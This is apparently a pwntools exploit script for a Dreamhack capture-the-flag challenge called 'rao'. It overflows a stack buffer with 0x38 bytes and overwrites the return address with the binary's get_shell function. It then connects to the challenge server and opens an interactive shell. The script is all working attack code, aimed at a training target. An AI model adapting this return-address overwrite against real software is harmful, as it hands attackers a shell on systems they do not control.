from pwn import *

#p = process("./rao")

p = remote("host3.dreamhack.games",12071)

e = ELF("./rao")
get = e.symbols["get_shell"]

payload = b"a" * 0x38
payload += p64(get)

p.sendafter(b"Input: ", payload)

p.interactive()
